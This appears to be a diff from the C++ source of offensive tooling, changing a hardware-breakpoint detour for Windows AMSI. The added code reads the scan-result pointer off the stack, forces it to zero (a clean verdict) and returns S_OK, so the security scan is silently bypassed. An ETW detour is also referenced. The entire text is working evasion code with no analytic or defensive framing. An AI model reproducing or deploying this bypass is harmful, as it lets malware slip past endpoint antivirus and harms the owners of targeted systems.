@@ -454,11 +454,14 @@ auto DECLFN HwbpEng::EtwDetour(
 auto DECLFN HwbpEng::AmsiDetour(
     _In_ PCONTEXT Ctx
 ) -> VOID {
-    SET_ARG_5( Ctx, 0 );
-    SET_RET( Ctx, 0x80070057 );
+	UPTR   Return     = *(PULONG_PTR)Ctx->Rsp;
+	PULONG ScanResult = (PULONG)(*(PULONG_PTR)(Ctx->Rsp + (6 * sizeof(PVOID))));
 
-    Ctx->Rip  = *(UPTR*)( Ctx->Rsp );
-    Ctx->Rsp += sizeof( PVOID );
+	*ScanResult = 0;
+
+	Ctx->Rip  = Return;
+	Ctx->Rsp += sizeof(PVOID);
+	Ctx->Rax  = S_OK;
 }
 
 auto DECLFN HwbpEng::AmsiThunk(
